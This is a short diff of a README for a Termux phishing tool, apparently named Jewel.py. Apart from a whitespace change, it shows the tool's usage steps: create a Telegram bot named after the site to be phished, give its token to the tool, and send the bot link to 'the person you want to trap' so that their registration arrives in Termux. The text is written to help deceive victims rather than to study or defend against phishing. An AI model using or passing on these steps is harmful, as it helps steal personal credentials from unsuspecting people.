@@ -23,7 +23,7 @@ python Jewel.py
 ````
 # employment
 
-* 1- Create a bot in Telegram and name it after the site you want to phish via https://t.me/BotFather .  
+*1- Create a bot in Telegram and name it after the site you want to phish via https://t.me/BotFather .  
 
 * 2- Run Termux and run this tool and when it asks Add the bot token, then send the bot link to the person you want to trap. When he registers in the bot, he will receive a message in Termux.
   
